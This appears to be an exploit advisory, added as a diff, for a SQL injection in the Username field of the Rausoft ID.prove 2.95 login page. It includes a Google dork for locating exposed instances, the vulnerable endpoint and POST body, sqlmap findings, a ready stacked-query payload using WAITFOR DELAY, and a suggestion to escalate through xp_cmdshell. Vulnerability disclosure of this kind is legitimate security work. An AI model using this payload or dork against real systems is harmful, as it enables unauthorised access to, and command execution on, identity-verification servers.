@@ -1,0 +1,20 @@
+# Exploit Title: Rausoft ID.prove 2.95 - 'Username' SQL injection
+# Google Dork: inurl:IdproveWebclient
+# Date: 2018-09-26
+# Exploit Author: Ilya Timchenko, Mercedes pay S.A.
+# Vendor Homepage: https://www.idprove.de
+# Software Link: https://www.idprove.de/english/index.php?option=com_content&view=article&id=17&Itemid=3
+# Version: 2.95
+# Tested on: Windows 2016
+# CVE : N/A
+# Description: An issue was discovered in Rausoft ID.prove 2.95. The login page with a field "Username" 
+# https://<<FQDN>>/IdproveWebclient/Account/Login?ReturnUrl=%2fIdproveWebclient%2fEinzelsuche --data="__RequestVerificationToken=<<dynamic_token_value>>&Username=a&PasswordTemp=a"
+# is vulnerable to the SQL injection via Microsoft SQL Server stacked queries in the Username POST parameter. 
+# Hypothetically, an attacker can utilize master..xp_cmdshell for the further privilege elevation.
+
+# SQLmap output:
+# Parameter: #1* ((custom) POST)
+# Type: stacked queries
+# Title: Microsoft SQL Server/Sybase stacked queries (comment)
+
+Payload: __RequestVerificationToken=<<dynamic_token_value>>&Username=a';WAITFOR DELAY '0:0:5'--&PasswordTemp=a
